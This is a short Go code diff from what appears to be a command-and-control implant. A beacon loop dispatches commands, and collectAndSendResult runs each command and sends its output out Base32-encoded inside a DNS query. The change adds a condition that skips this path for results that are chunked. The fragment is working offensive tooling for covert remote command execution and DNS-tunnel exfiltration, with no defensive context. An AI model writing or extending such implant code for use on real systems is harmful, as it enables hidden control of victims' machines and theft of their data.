@@ -83,9 +83,11 @@ func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
 	}
 }
 
-func collectAndSendResult(cmd commands.Command, commandArgs []string, job string){
-	result := cmd.Execute(commandArgs)
-	dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+func collectAndSendResult(cmd commands.Command, commandArgs []string, job string) {
+	if !commands.ShouldChunkResult(cmd) {
+		result := cmd.Execute(commandArgs)
+		dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+	}
 }
 
 func initContext(cfg *config.Config) *config.Context {
